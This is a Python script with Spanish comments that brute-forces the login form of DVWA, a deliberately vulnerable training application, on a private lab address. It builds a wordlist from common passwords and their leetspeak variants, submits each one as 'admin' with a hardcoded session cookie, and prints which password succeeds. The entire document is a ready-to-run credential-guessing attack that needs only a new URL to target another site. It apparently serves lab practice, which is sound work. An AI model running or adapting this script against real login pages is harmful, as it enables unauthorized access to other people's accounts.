import requests
import itertools

# Configuración inicial
url = 'http://192.168.1.13/DVWA/vulnerabilities/brute/'
cookies = {'security': 'low', 'PHPSESSID': 'm3fd4o73t1cqhekkl54girg1tj'}
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
}

# Generar una lista de palabras dirigida
base_words = ['admin', 'password', 'pass', 'admin123', 'root', '123456', 'admin!@#']
leet_transformations = {
    'a': '@',
    'i': '1',
    'e': '3',
    'o': '0',
    's': '$'
}

# Función para transformar palabras a leetspeak
def to_leet_speak(word):
    return ''.join(leet_transformations.get(char, char) for char in word)

# Crear la lista de palabras dirigida
targeted_wordlist = set(base_words + [to_leet_speak(word) for word in base_words])

# Función para realizar intentos de login
def brute_force_login(url, username, wordlist):
    for password in wordlist:
        response = requests.get(url, params={
            'username': username,
            'password': password,
            'Login': 'Login'
        }, cookies=cookies, headers=headers)
        
        if "Username and/or password incorrect." in response.text:
            print(f"Fallo con: {password}")
        else:
            print(f"¡Éxito! Usuario: admin Contraseña: {password}")
            break


# Ejecutar el ataque de fuerza bruta
brute_force_login(url, 'admin', targeted_wordlist)
